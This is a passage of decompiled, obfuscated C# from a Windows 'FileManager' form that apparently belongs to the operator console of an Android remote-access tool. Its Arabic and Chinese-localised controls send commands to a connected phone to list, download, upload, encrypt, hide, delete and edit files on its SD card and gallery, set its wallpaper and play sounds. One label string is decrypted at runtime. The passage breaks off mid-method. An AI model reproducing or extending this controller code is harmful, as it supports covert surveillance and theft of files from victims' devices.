					dcmbtn.Click -= value2;
				}
				this._dcmbtn = value;
				dcmbtn = this._dcmbtn;
				if (dcmbtn != null)
				{
					dcmbtn.Click += value2;
				}
			}
		}

		// Token: 0x170003BC RID: 956
		// (get) Token: 0x06000CC6 RID: 3270 RVA: 0x0000673C File Offset: 0x0000493C
		// (set) Token: 0x06000CC7 RID: 3271 RVA: 0x00085660 File Offset: 0x00083860
		internal virtual DrakeUIButtonIcon picbtn
		{
			[CompilerGenerated]
			get
			{
				return this._picbtn;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.picbtn_Click);
				DrakeUIButtonIcon picbtn = this._picbtn;
				if (picbtn != null)
				{
					picbtn.Click -= value2;
				}
				this._picbtn = value;
				picbtn = this._picbtn;
				if (picbtn != null)
				{
					picbtn.Click += value2;
				}
			}
		}

		// Token: 0x170003BD RID: 957
		// (get) Token: 0x06000CC8 RID: 3272 RVA: 0x00006744 File Offset: 0x00004944
		// (set) Token: 0x06000CC9 RID: 3273 RVA: 0x000856A4 File Offset: 0x000838A4
		internal virtual DrakeUIButtonIcon DrakeUIButtonIcon4
		{
			[CompilerGenerated]
			get
			{
				return this._DrakeUIButtonIcon4;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.DrakeUIButtonIcon4_Click);
				DrakeUIButtonIcon drakeUIButtonIcon = this._DrakeUIButtonIcon4;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click -= value2;
				}
				this._DrakeUIButtonIcon4 = value;
				drakeUIButtonIcon = this._DrakeUIButtonIcon4;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click += value2;
				}
			}
		}

		// Token: 0x170003BE RID: 958
		// (get) Token: 0x06000CCA RID: 3274 RVA: 0x0000674C File Offset: 0x0000494C
		// (set) Token: 0x06000CCB RID: 3275 RVA: 0x000856E8 File Offset: 0x000838E8
		internal virtual DrakeUIButtonIcon DrakeUIButtonIcon5
		{
			[CompilerGenerated]
			get
			{
				return this._DrakeUIButtonIcon5;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.DrakeUIButtonIcon5_Click);
				DrakeUIButtonIcon drakeUIButtonIcon = this._DrakeUIButtonIcon5;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click -= value2;
				}
				this._DrakeUIButtonIcon5 = value;
				drakeUIButtonIcon = this._DrakeUIButtonIcon5;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click += value2;
				}
			}
		}

		// Token: 0x170003BF RID: 959
		// (get) Token: 0x06000CCC RID: 3276 RVA: 0x00006754 File Offset: 0x00004954
		// (set) Token: 0x06000CCD RID: 3277 RVA: 0x0008572C File Offset: 0x0008392C
		internal virtual DrakeUIButtonIcon DrakeUIButtonIcon6
		{
			[CompilerGenerated]
			get
			{
				return this._DrakeUIButtonIcon6;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.DrakeUIButtonIcon6_Click);
				DrakeUIButtonIcon drakeUIButtonIcon = this._DrakeUIButtonIcon6;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click -= value2;
				}
				this._DrakeUIButtonIcon6 = value;
				drakeUIButtonIcon = this._DrakeUIButtonIcon6;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click += value2;
				}
			}
		}

		// Token: 0x170003C0 RID: 960
		// (get) Token: 0x06000CCE RID: 3278 RVA: 0x0000675C File Offset: 0x0000495C
		// (set) Token: 0x06000CCF RID: 3279 RVA: 0x00085770 File Offset: 0x00083970
		internal virtual DrakeUIButtonIcon DrakeUIButtonIcon7
		{
			[CompilerGenerated]
			get
			{
				return this._DrakeUIButtonIcon7;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.DrakeUIButtonIcon7_Click);
				DrakeUIButtonIcon drakeUIButtonIcon = this._DrakeUIButtonIcon7;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click -= value2;
				}
				this._DrakeUIButtonIcon7 = value;
				drakeUIButtonIcon = this._DrakeUIButtonIcon7;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click += value2;
				}
			}
		}

		// Token: 0x170003C1 RID: 961
		// (get) Token: 0x06000CD0 RID: 3280 RVA: 0x00006764 File Offset: 0x00004964
		// (set) Token: 0x06000CD1 RID: 3281 RVA: 0x000857B4 File Offset: 0x000839B4
		internal virtual DrakeUIButtonIcon DrakeUIButtonIcon8
		{
			[CompilerGenerated]
			get
			{
				return this._DrakeUIButtonIcon8;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.DrakeUIButtonIcon8_Click);
				DrakeUIButtonIcon drakeUIButtonIcon = this._DrakeUIButtonIcon8;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click -= value2;
				}
				this._DrakeUIButtonIcon8 = value;
				drakeUIButtonIcon = this._DrakeUIButtonIcon8;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click += value2;
				}
			}
		}

		// Token: 0x170003C2 RID: 962
		// (get) Token: 0x06000CD2 RID: 3282 RVA: 0x0000676C File Offset: 0x0000496C
		// (set) Token: 0x06000CD3 RID: 3283 RVA: 0x000857F8 File Offset: 0x000839F8
		internal virtual DrakeUIDataGridView DGV0
		{
			[CompilerGenerated]
			get
			{
				return this._DGV0;
			}
			[CompilerGenerated]
			set
			{
				DataGridViewSortCompareEventHandler value2 = new DataGridViewSortCompareEventHandler(this.DGV0_SortCompare);
				DataGridViewCellMouseEventHandler value3 = new DataGridViewCellMouseEventHandler(this.DGV0_CellMouseDoubleClick);
				EventHandler value4 = new EventHandler(this.DGV0_SelectionChanged);
				DrakeUIDataGridView dgv = this._DGV0;
				if (dgv != null)
				{
					dgv.SortCompare -= value2;
					dgv.CellMouseDoubleClick -= value3;
					dgv.SelectionChanged -= value4;
				}
				this._DGV0 = value;
				dgv = this._DGV0;
				if (dgv != null)
				{
					dgv.SortCompare += value2;
					dgv.CellMouseDoubleClick += value3;
					dgv.SelectionChanged += value4;
				}
			}
		}

		// Token: 0x170003C3 RID: 963
		// (get) Token: 0x06000CD4 RID: 3284 RVA: 0x00006774 File Offset: 0x00004974
		// (set) Token: 0x06000CD5 RID: 3285 RVA: 0x0008587C File Offset: 0x00083A7C
		internal virtual DataGridViewTextBoxColumn typ { get; set; }

		// Token: 0x170003C4 RID: 964
		// (get) Token: 0x06000CD6 RID: 3286 RVA: 0x0000677C File Offset: 0x0000497C
		// (set) Token: 0x06000CD7 RID: 3287 RVA: 0x00085890 File Offset: 0x00083A90
		internal virtual DataGridViewTextBoxColumn nam { get; set; }

		// Token: 0x170003C5 RID: 965
		// (get) Token: 0x06000CD8 RID: 3288 RVA: 0x00006784 File Offset: 0x00004984
		// (set) Token: 0x06000CD9 RID: 3289 RVA: 0x000858A4 File Offset: 0x00083AA4
		internal virtual DataGridViewTextBoxColumn siz { get; set; }

		// Token: 0x170003C6 RID: 966
		// (get) Token: 0x06000CDA RID: 3290 RVA: 0x0000678C File Offset: 0x0000498C
		// (set) Token: 0x06000CDB RID: 3291 RVA: 0x000858B8 File Offset: 0x00083AB8
		internal virtual DataGridViewTextBoxColumn mofdat { get; set; }

		// Token: 0x170003C7 RID: 967
		// (get) Token: 0x06000CDC RID: 3292 RVA: 0x00006794 File Offset: 0x00004994
		// (set) Token: 0x06000CDD RID: 3293 RVA: 0x000858CC File Offset: 0x00083ACC
		internal virtual DataGridViewTextBoxColumn dat { get; set; }

		// Token: 0x170003C8 RID: 968
		// (get) Token: 0x06000CDE RID: 3294 RVA: 0x0000679C File Offset: 0x0000499C
		// (set) Token: 0x06000CDF RID: 3295 RVA: 0x000858E0 File Offset: 0x00083AE0
		internal virtual DataGridViewImageColumn ic { get; set; }

		// Token: 0x170003C9 RID: 969
		// (get) Token: 0x06000CE0 RID: 3296 RVA: 0x000067A4 File Offset: 0x000049A4
		// (set) Token: 0x06000CE1 RID: 3297 RVA: 0x000858F4 File Offset: 0x00083AF4
		internal virtual Panel Panel3 { get; set; }

		// Token: 0x170003CA RID: 970
		// (get) Token: 0x06000CE2 RID: 3298 RVA: 0x000067AC File Offset: 0x000049AC
		// (set) Token: 0x06000CE3 RID: 3299 RVA: 0x00085908 File Offset: 0x00083B08
		internal virtual DrakeUIButtonIcon cancelbtn
		{
			[CompilerGenerated]
			get
			{
				return this._cancelbtn;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.cancelbtn_Click);
				DrakeUIButtonIcon cancelbtn = this._cancelbtn;
				if (cancelbtn != null)
				{
					cancelbtn.Click -= value2;
				}
				this._cancelbtn = value;
				cancelbtn = this._cancelbtn;
				if (cancelbtn != null)
				{
					cancelbtn.Click += value2;
				}
			}
		}

		// Token: 0x170003CB RID: 971
		// (get) Token: 0x06000CE4 RID: 3300 RVA: 0x000067B4 File Offset: 0x000049B4
		// (set) Token: 0x06000CE5 RID: 3301 RVA: 0x0008594C File Offset: 0x00083B4C
		internal virtual DrakeWidth_W DrakeWidth_W4 { get; set; }

		// Token: 0x170003CC RID: 972
		// (get) Token: 0x06000CE6 RID: 3302 RVA: 0x000067BC File Offset: 0x000049BC
		// (set) Token: 0x06000CE7 RID: 3303 RVA: 0x00085960 File Offset: 0x00083B60
		internal virtual DrakeWidth_W DrakeWidth_W3 { get; set; }

		// Token: 0x170003CD RID: 973
		// (get) Token: 0x06000CE8 RID: 3304 RVA: 0x000067C4 File Offset: 0x000049C4
		// (set) Token: 0x06000CE9 RID: 3305 RVA: 0x00085974 File Offset: 0x00083B74
		internal virtual DrakeWidth_W DrakeWidth_W2 { get; set; }

		// Token: 0x170003CE RID: 974
		// (get) Token: 0x06000CEA RID: 3306 RVA: 0x000067CC File Offset: 0x000049CC
		// (set) Token: 0x06000CEB RID: 3307 RVA: 0x00085988 File Offset: 0x00083B88
		internal virtual DrakeUITextBox pathtxt { get; set; }

		// Token: 0x170003CF RID: 975
		// (get) Token: 0x06000CEC RID: 3308 RVA: 0x000067D4 File Offset: 0x000049D4
		// (set) Token: 0x06000CED RID: 3309 RVA: 0x0008599C File Offset: 0x00083B9C
		internal virtual DrakeUIButtonIcon ClearButton
		{
			[CompilerGenerated]
			get
			{
				return this._ClearButton;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.ClearButton_Click);
				DrakeUIButtonIcon clearButton = this._ClearButton;
				if (clearButton != null)
				{
					clearButton.Click -= value2;
				}
				this._ClearButton = value;
				clearButton = this._ClearButton;
				if (clearButton != null)
				{
					clearButton.Click += value2;
				}
			}
		}

		// Token: 0x170003D0 RID: 976
		// (get) Token: 0x06000CEE RID: 3310 RVA: 0x000067DC File Offset: 0x000049DC
		// (set) Token: 0x06000CEF RID: 3311 RVA: 0x000859E0 File Offset: 0x00083BE0
		internal virtual DrakeUIAvatar clearsrchbtn
		{
			[CompilerGenerated]
			get
			{
				return this._clearsrchbtn;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.clearsrchbtn_Click);
				DrakeUIAvatar clearsrchbtn = this._clearsrchbtn;
				if (clearsrchbtn != null)
				{
					clearsrchbtn.Click -= value2;
				}
				this._clearsrchbtn = value;
				clearsrchbtn = this._clearsrchbtn;
				if (clearsrchbtn != null)
				{
					clearsrchbtn.Click += value2;
				}
			}
		}

		// Token: 0x170003D1 RID: 977
		// (get) Token: 0x06000CF0 RID: 3312 RVA: 0x000067E4 File Offset: 0x000049E4
		// (set) Token: 0x06000CF1 RID: 3313 RVA: 0x00085A24 File Offset: 0x00083C24
		internal virtual DrakeUITextBox searchtext
		{
			[CompilerGenerated]
			get
			{
				return this._searchtext;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.searchtext_TextChanged);
				DrakeUITextBox searchtext = this._searchtext;
				if (searchtext != null)
				{
					searchtext.TextChanged -= value2;
				}
				this._searchtext = value;
				searchtext = this._searchtext;
				if (searchtext != null)
				{
					searchtext.TextChanged += value2;
				}
			}
		}

		// Token: 0x170003D2 RID: 978
		// (get) Token: 0x06000CF2 RID: 3314 RVA: 0x000067EC File Offset: 0x000049EC
		// (set) Token: 0x06000CF3 RID: 3315 RVA: 0x00085A68 File Offset: 0x00083C68
		internal virtual DrakeUIAvatar searchbtn
		{
			[CompilerGenerated]
			get
			{
				return this._searchbtn;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.searchbtn_Click);
				DrakeUIAvatar searchbtn = this._searchbtn;
				if (searchbtn != null)
				{
					searchbtn.Click -= value2;
				}
				this._searchbtn = value;
				searchbtn = this._searchbtn;
				if (searchbtn != null)
				{
					searchbtn.Click += value2;
				}
			}
		}

		// Token: 0x170003D3 RID: 979
		// (get) Token: 0x06000CF4 RID: 3316 RVA: 0x000067F4 File Offset: 0x000049F4
		// (set) Token: 0x06000CF5 RID: 3317 RVA: 0x00085AAC File Offset: 0x00083CAC
		internal virtual Panel Panel4 { get; set; }

		// Token: 0x170003D4 RID: 980
		// (get) Token: 0x06000CF6 RID: 3318 RVA: 0x000067FC File Offset: 0x000049FC
		// (set) Token: 0x06000CF7 RID: 3319 RVA: 0x00085AC0 File Offset: 0x00083CC0
		internal virtual Label Label1 { get; set; }

		// Token: 0x170003D5 RID: 981
		// (get) Token: 0x06000CF8 RID: 3320 RVA: 0x00006804 File Offset: 0x00004A04
		// (set) Token: 0x06000CF9 RID: 3321 RVA: 0x00085AD4 File Offset: 0x00083CD4
		internal virtual DrakeUICheckBox thumb_chk { get; set; }

		// Token: 0x06000CFA RID: 3322 RVA: 0x0000246D File Offset: 0x0000066D
		private void method_0()
		{
		}

		// Token: 0x06000CFB RID: 3323 RVA: 0x00085AE8 File Offset: 0x00083CE8
		public void method_1()
		{
			string left = Module4.smethod_1();
			if (Operators.CompareString(left, "AR", false) != 0)
			{
				if (Operators.CompareString(left, "CN", false) == 0)
				{
					this.cancelbtn.Text = "停止";
					this.cancelbtn.Text = "清除";
					this.Downpic.Text = "下载";
					this.sdbtn.Text = "SD卡";
					this.dcmbtn.Text = "画廊";
					this.picbtn.Text = "图片";
					this.ThumbsCont.Text = "以前见过的使用";
					this.DGV0.Columns[0].HeaderText = "类型";
					this.DGV0.Columns[1].HeaderText = "姓名";
					this.DGV0.Columns[2].HeaderText = "尺寸";
					this.DGV0.Columns[3].HeaderText = "修改日期";
					this.DGV0.Columns[4].HeaderText = "创建日期";
					this.ctxMenu.Items[0].Text = "打开";
					this.ctxMenu.Items[1].Text = "复制";
					this.ctxMenu.Items[2].Text = "切";
					this.ctxMenu.Items[3].Text = "粘贴";
					this.ctxMenu.Items[4].Text = "下载";
					this.ctxMenu.Items[5].Text = "上传";
					this.ctxMenu.Items[6].Text = "加密";
					this.ctxMenu.Items[7].Text = "解密";
					this.ctxMenu.Items[8].Text = "压缩";
					this.ctxMenu.Items[9].Text = "解压";
					this.ctxMenu.Items[10].Text = "删除";
					this.ctxMenu.Items[11].Text = "创建文件";
					this.ctxMenu.Items[12].Text = "改名";
					this.ctxMenu.Items[13].Text = "编辑";
					this.ctxMenu.Items[14].Text = "隐藏";
					this.ctxMenu.Items[15].Text = "取消隐藏";
					this.ctxMenu.Items[16].Text = "设置为墙纸";
					this.ctxMenu.Items[17].Text = "播放声音";
					this.ctxMenu.Items[18].Text = "下载";
				}
			}
			else
			{
				this.cancelbtn.Text = "إيقاف";
				this.cancelbtn.Text = "حذف";
				this.Downpic.Text = "التحميلات";
				this.sdbtn.Text = "زاكرة الهاتف";
				this.dcmbtn.Text = "المعرض";
				this.picbtn.Text = "الصور";
				this.ThumbsCont.Text = "عرض من المحمل مسبقا";
				this.DGV0.Columns[0].HeaderText = "النوع";
				this.DGV0.Columns[1].HeaderText = "الأسم";
				this.DGV0.Columns[2].HeaderText = "الحجم";
				this.DGV0.Columns[3].HeaderText = "تاريخ التعديل";
				this.DGV0.Columns[4].HeaderText = "تاريخ الأنشاء";
				this.ctxMenu.Items[0].Text = "فتح";
				this.ctxMenu.Items[1].Text = "نسخ";
				this.ctxMenu.Items[2].Text = "قص";
				this.ctxMenu.Items[3].Text = "لصق";
				this.ctxMenu.Items[4].Text = "تحميل";
				this.ctxMenu.Items[5].Text = "إرسال ملف";
				this.ctxMenu.Items[6].Text = "تشفير";
				this.ctxMenu.Items[7].Text = "فك التشفير";
				this.ctxMenu.Items[8].Text = "ضغط";
				this.ctxMenu.Items[9].Text = "فك الضغط";
				this.ctxMenu.Items[10].Text = "حذف";
				this.ctxMenu.Items[11].Text = "إنشاء ملف";
				this.ctxMenu.Items[12].Text = "إعادة تسمية";
				this.ctxMenu.Items[13].Text = "تعديل";
				this.ctxMenu.Items[14].Text = "إخفاء";
				this.ctxMenu.Items[15].Text = "إظهار";
				this.ctxMenu.Items[16].Text = "تعين كخلفية الهاتف";
				this.ctxMenu.Items[17].Text = "تشغيل مقطع صوتي";
				this.ctxMenu.Items[18].Text = "التحميلات";
			}
		}

		// Token: 0x06000CFC RID: 3324 RVA: 0x00086128 File Offset: 0x00084328
		private void FileManager_Load(object sender, EventArgs e)
		{
			base.SetStyle(ControlStyles.UserPaint | ControlStyles.SupportsTransparentBackColor | ControlStyles.AllPaintingInWmPaint | ControlStyles.OptimizedDoubleBuffer, true);
			base.ActiveControl = this.DGV0;
			base.Tag = "File" + this.gclass8_0.string_9;
			this.Timer1.Start();
			this.string_3 = Convert.ToString(MySettingsProperty.Settings.ImageQualty);
			base.Icon = new Icon(Module8.string_1 + "\\Icons\\win\\9.ico");
			this.usrscreen.Image = Module8.smethod_27(this.gclass8_0.string_4);
			this.method_1();
			this.Timer2.Start();
			this.DGV0.ColumnHeadersDefaultCellStyle.Font = Module8.font_1;
			this.DGV0.DefaultCellStyle.Font = Module8.font_1;
			this.ctxMenu.Renderer = new GClass12();
			this.Text = this.string_0;
			try
			{
			}
			catch (Exception)
			{
			}
			this.Label1.Text = Module2.smethod_60("zIP9ZSzCinaAzselRXUoBQ==", "9653641976824591");
			this.OpenToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
			this.OpenToolStripMenuItem.Image = new Bitmap(Module8.string_1 + "\\Icons\\Menu_Items\\17\\open.png");
			this.OpenToolStripMenuItem.Tag = new object[]
			{
				0,
				"null",
				"null"
			};
			this.DownloadToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
			this.DownloadToolStripMenuItem.Image = new Bitmap(Module8.string_1 + "\\Icons\\Menu_Items\\17\\download.png");
			this.DownloadToolStripMenuItem.Tag = new object[]
			{
				0,
				"null",
				"null"
			};
			this.UploadToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
			this.UploadToolStripMenuItem.Image = new Bitmap(Module8.string_1 + "\\Icons\\Menu_Items\\17\\upload.png");
			this.UploadToolStripMenuItem.Tag = new object[]
			{
				0,
				"null",
				"null"
			};
			this.EncryptToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
			this.EncryptToolStripMenuItem.Image = new Bitmap(Module8.string_1 + "\\Icons\\Menu_Items\\17\\encrypt.png");
			this.EncryptToolStripMenuItem.Tag = new object[]
			{
				0,
				"null",
				"null"
			};
			this.DecodeToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
			this.DecodeToolStripMenuItem.Image = new Bitmap(Module8.string_1 + "\\Icons\\Menu_Items\\17\\decode.png");
			this.DecodeToolStripMenuItem.Tag = new object[]
			{
				0,
				"null",
				"null"
			};
			this.ZipToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
			this.ZipToolStripMenuItem.Image = new Bitmap(Module8.string_1 + "\\Icons\\Menu_Items\\17\\zip.png");
			this.ZipToolStripMenuItem.Tag = new object[]
			{
				0,
				"null",
				"null"
			};
			this.UnZipToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
			this.UnZipToolStripMenuItem.Image = new Bitmap(Module8.string_1 + "\\Icons\\Menu_Items\\17\\unzip.png");
			this.UnZipToolStripMenuItem.Tag = new object[]
			{
				0,
				"null",
				"null"
			};
			this.DeleteToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
			this.DeleteToolStripMenuItem.Image = new Bitmap(Module8.string_1 + "\\Icons\\Menu_Items\\17\\delete.png");
			this.DeleteToolStripMenuItem.Tag = new object[]
			{
				0,
				"null",
				"null"
			};
			this.AddFilesToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
			this.AddFilesToolStripMenuItem.Image = new Bitmap(Module8.string_1 + "\\Icons\\Menu_Items\\17\\add.png");
			this.AddFilesToolStripMenuItem.Tag = new object[]
			{
				0,
				"null",
				"null"
			};
			this.RenameToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
			this.RenameToolStripMenuItem.Image = new Bitmap(Module8.string_1 + "\\Icons\\Menu_Items\\17\\rename.png");
			this.RenameToolStripMenuItem.Tag = new object[]
			{
				0,
				"null",
				"null"
			};
			this.EditToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
			this.EditToolStripMenuItem.Image = new Bitmap(Module8.string_1 + "\\Icons\\Menu_Items\\17\\edit.png");
			this.EditToolStripMenuItem.Tag = new object[]
			{
				0,
				"null",
				"null"
			};
			this.HideToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
			this.HideToolStripMenuItem.Image = new Bitmap(Module8.string_1 + "\\Icons\\Menu_Items\\17\\hidden.png");
			this.HideToolStripMenuItem.Tag = new object[]
			{
				0,
				"null",
				"null"
			};
			this.ShowToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
			this.ShowToolStripMenuItem.Image = new Bitmap(Module8.string_1 + "\\Icons\\Menu_Items\\17\\show.png");
			this.ShowToolStripMenuItem.Tag = new object[]
			{
				0,
				"null",
				"null"
			};
			this.FolderDownloadsToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
			this.FolderDownloadsToolStripMenuItem.Image = new Bitmap(Module8.string_1 + "\\Icons\\Menu_Items\\17\\downloads.png");
			this.FolderDownloadsToolStripMenuItem.Tag = new object[]
			{
				0,
				"null",
				"null"
			};
			this.CutToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
			this.CutToolStripMenuItem.Image = new Bitmap(Module8.string_1 + "\\Icons\\Menu_Items\\17\\cut.png");
			this.CutToolStripMenuItem.Tag = new object[]
			{
				0,
				"null",
				"null"
			};
			this.CopyToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
			this.CopyToolStripMenuItem.Image = new Bitmap(Module8.string_1 + "\\Icons\\Menu_Items\\17\\copy.png");
			this.CopyToolStripMenuItem.Tag = new object[]
			{
				0,
				"null",
				"null"
			};
			this.PasteToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
			this.PasteToolStripMenuItem.Image = new Bitmap(Module8.string_1 + "\\Icons\\Menu_Items\\17\\paste.png");
			this.PasteToolStripMenuItem.Tag = new object[]
			{
				0,
				"null",
				"null"
			};
			this.SetWallpaperToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
			this.SetWallpaperToolStripMenuItem.Image = new Bitmap(Module8.string_1 + "\\Icons\\Menu_Items\\17\\wallpaper.png");
			this.SetWallpaperToolStripMenuItem.Tag = new object[]
			{
				0,
				"null",
				"null"
			};
			this.PlaySoundToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
			this.PlaySoundToolStripMenuItem.Image = new Bitmap(Module8.string_1 + "\\Icons\\Menu_Items\\17\\playsound.png");
			this.PlaySoundToolStripMenuItem.Tag = new object[]
			{
				0,
				"null",
				"null"
			};
			this.TOpacity.Interval = Module5.int_0;
			this.TOpacity.Enabled = true;
		}

		// Token: 0x06000CFD RID: 3325 RVA: 0x000868B0 File Offset: 0x00084AB0
		private void DGV0_SortCompare(object sender, DataGridViewSortCompareEventArgs e)
		{
			if (e.RowIndex1 == 0)
			{
				e.Handled = true;
			}
		}

		// Token: 0x06000CFE RID: 3326 RVA: 0x000868D0 File Offset: 0x00084AD0
		private void DGV0_CellMouseDoubleClick(object sender, DataGridViewCellMouseEventArgs e)
		{
			try
			{
				string text = this.DGV0.CurrentRow.Index.ToString();
				string text2 = this.pathtxt.Text;
				if (this.collection_0.Contains(text2))
				{
					object[] array = (object[])this.collection_0[text2];
					string left = Conversions.ToString(array[0]);
					if (Operators.CompareString(left, this.DGV0.CurrentRow.Index.ToString(), false) != 0)
					{
						this.int_0 = this.DGV0.CurrentRow.Index;
					}
				}
				else
				{
					this.collection_0.Add(new object[]
					{
						text
					}, text2, null, null);
					this.int_0 = this.DGV0.CurrentRow.Index;
				}
			}
			catch (Exception ex)
			{
			}
			if (e.RowIndex > 0 && e.ColumnIndex >= 0)
			{
				if (!Operators.ConditionalCompareObjectEqual(this.DGV0.Rows[e.RowIndex].Cells[0].Tag, "0", false))
				{
					string text3 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), this.DGV0.Rows[e.RowIndex].Cells[1].Value));
					string left2 = Conversions.ToString(this.DGV0.Rows[e.RowIndex].Cells[0].Tag);
					string text4 = Conversions.ToString(this.DGV0.Rows[e.RowIndex].Cells[1].Value);
					if (Operators.CompareString(left2, "1", false) == 0)
					{
						if (this.method_25(text4.ToLower()))
						{
							object objectValue = RuntimeHelpers.GetObjectValue(this.DGV0.Rows[e.RowIndex].Cells[2].Tag);
							if (!Operators.ConditionalCompareObjectLessEqual(objectValue, 512000, false))
							{
								Interaction.MsgBox(string.Format(this.string_2, RuntimeHelpers.GetObjectValue(this.DGV0.Rows[e.RowIndex].Cells[2].Value), RuntimeHelpers.GetObjectValue(this.DGV0.Rows[e.RowIndex].Cells[1].Value)), MsgBoxStyle.Critical, Module8.string_5);
							}
							else if (this.gclass8_0 != null)
							{
								object[] objects_ = new object[]
								{
									this.object_0,
									string.Concat(new string[]
									{
										Module13.string_28,
										GClass9.string_0,
										Module8.string_4,
										".files",
										GClass9.string_0,
										"method",
										GClass9.string_0,
										Module13.string_22,
										GClass9.string_0,
										"edit",
										GClass9.string_1,
										text3
									}),
									Module2.smethod_9().GetBytes("null"),
									this.gclass8_0
								};
								this.gclass8_0.method_2(objects_);
							}
						}
						else
						{
							object obj;
							if (this.method_26(text4.ToLower()))
							{
								obj = "false";
							}
							else if (!this.method_27(text4.ToLower()))
							{
								obj = "null";
							}
							else
							{
								obj = "true";
							}
							if (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(obj, "null", false))) && this.gclass8_0 != null)
							{
								string[] array2 = this.gclass8_0.string_0.Split(new char[]
								{
									':'
								});
								object[] objects_2 = new object[]
								{
									this.object_0,
									Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(string.Concat(new string[]
									{
										Module13.string_28,
										GClass9.string_0,
										Module8.string_4,
										".files",
										GClass9.string_0,
										"method",
										GClass9.string_0,
										Module13.string_40,
										GClass9.string_0,
										"small",
										GClass9.string_1,
										array2[0],
										GClass9.string_1,
										array2[1],
										GClass9.string_1,
										text3,
										GClass9.string_1
									}), obj), GClass9.string_1), this.string_3), GClass9.string_1), Module13.string_17), "File" + this.gclass8_0.string_9),
									Module2.smethod_9().GetBytes("null"),
									this.gclass8_0
								};
								this.gclass8_0.method_2(objects_2);
							}
						}
					}
				}
				else if (this.gclass8_0 != null)
				{
					object[] objects_3 = new object[]
					{
						this.object_0,
						Operators.ConcatenateObject(string.Concat(new string[]
						{
							Module13.string_28,
							GClass9.string_0,
							Module8.string_4,
							".files",
							GClass9.string_0,
							"method",
							GClass9.string_0,
							Module13.string_6,
							GClass9.string_0,
							"files",
							GClass9.string_1
						}), this.method_5(Conversions.ToString(this.DGV0.Tag), Conversions.ToString(this.DGV0.Rows[e.RowIndex].Cells[1].Value))),
						Module2.smethod_9().GetBytes("null"),
						this.gclass8_0
					};
					this.gclass8_0.method_2(objects_3);
				}
			}
			else if (e.RowIndex == 0 && e.ColumnIndex >= 0 && this.gclass8_0 != null)
			{
				object[] objects_4 = new object[]
				{
					this.object_0,
					Operators.ConcatenateObject(string.Concat(new string[]
					{
						Module13.string_28,
						GClass9.string_0,
						Module8.string_4,
						".files",
						GClass9.string_0,
						"method",
						GClass9.string_0,
						Module13.string_6,
						GClass9.string_0,
						"files",
						GClass9.string_1
					}), this.method_4(Conversions.ToString(this.DGV0.Tag))),
					Module2.smethod_9().GetBytes("null"),
					this.gclass8_0
				};
				this.gclass8_0.method_2(objects_4);
			}
		}

		// Token: 0x06000CFF RID: 3327 RVA: 0x00086FD0 File Offset: 0x000851D0
		private object method_4(string string_0)
		{
			string text = string.Format("{0}", string_0.Substring(0, string_0.LastIndexOf("/")));
			return (!text.Contains("/")) ? "/" : text;
		}

		// Token: 0x06000D00 RID: 3328 RVA: 0x00087014 File Offset: 0x00085214
		private object method_5(string string_0, string string_1)
		{
			return string.Format("{0}/{1}", string_0, string_1);
		}

		// Token: 0x06000D01 RID: 3329 RVA: 0x00087030 File Offset: 0x00085230
		private void DownloadToolStripMenuItem_Click(object sender, EventArgs e)
		{
			checked
			{
				if (this.DGV0.SelectedRows.Count > 0)
				{
					int num = this.DGV0.SelectedRows.Count - 1;
					for (int i = num; i >= 0; i += -1)
					{
						string left = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[0].Tag);
						if (Operators.CompareString(left, "1", false) == 0)
						{
							string text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value));
							if (this.gclass8_0 != null)
							{
